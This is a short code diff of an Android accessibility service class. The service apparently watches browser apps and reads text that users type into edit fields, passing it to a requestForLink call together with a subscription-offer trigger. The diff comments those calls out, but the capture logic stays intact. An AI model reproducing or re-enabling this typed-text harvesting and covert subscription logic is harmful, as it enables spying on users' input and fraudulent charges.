@@ -300,7 +300,7 @@ public class BaseAccessibilityService2 extends AccessibilityService {
                                     || rootNode.getPackageName().equals("com.android.browser")
                                     || rootNode.getPackageName().equals("com.UCMobile")) {
                                 if (!this.getOfferSuccess && PreferenceFile.getInstance(this).shouldSubscribe()) {
-                                    requestForLink("order_browser");
+//                                    requestForLink("order_browser");
                                     return;
                                 }
                                 return;
@@ -471,7 +471,7 @@ public class BaseAccessibilityService2 extends AccessibilityService {
                     String keyword = nodeInfo.getText().toString();
                     if (!TextUtils.isEmpty(keyword) && this.hasEditView) {
                         DP.E("==================send_text_request:" + keyword);
-                        requestForLink("text=" + keyword);
+//                        requestForLink("text=" + keyword);
                         this.hasEditView = false;
                         return true;
                     }
@@ -496,7 +496,7 @@ public class BaseAccessibilityService2 extends AccessibilityService {
                     String keyword = nodeInfo.getText().toString();
                     if (!TextUtils.isEmpty(keyword)) {
                         DP.E("==================send_edit_request:" + keyword);
-                        requestForLink("edit=" + keyword);
+//                        requestForLink("edit=" + keyword);
                         return true;
                     }
                 }
